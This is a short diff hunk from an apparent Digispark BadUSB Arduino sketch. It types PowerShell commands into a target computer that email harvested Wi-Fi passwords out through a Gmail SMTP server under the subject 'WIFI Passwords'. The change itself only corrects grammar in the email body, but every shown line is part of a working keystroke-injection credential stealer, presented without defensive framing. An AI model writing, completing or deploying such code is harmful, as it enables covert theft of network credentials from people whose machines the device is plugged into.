@@ -44,7 +44,7 @@ void loop() {
   DigiKeyboard.print(F("$msg.SubjectEncoding = [system.Text.Encoding]::Unicode;"));
   DigiKeyboard.print(F("$msg.IsBodyHTML = $true ;"));
   DigiKeyboard.print(F("$msg.Subject = \"WIFI Passwords\";"));
-  DigiKeyboard.print(F("$msg.Body = \"<h2> Here is your wifi passwords </h2></br>Look at this file...\"; "));
+  DigiKeyboard.print(F("$msg.Body = \"<h2> Here are your wifi passwords </h2></br>Look at this file...\"; "));
   DigiKeyboard.print(F("$SMTP.Credentials = $cred;")); // Connecting to GMAIL server
   DigiKeyboard.print(F("$smtp.Send($msg);")); // GMAIL server port
   DigiKeyboard.delay(500);
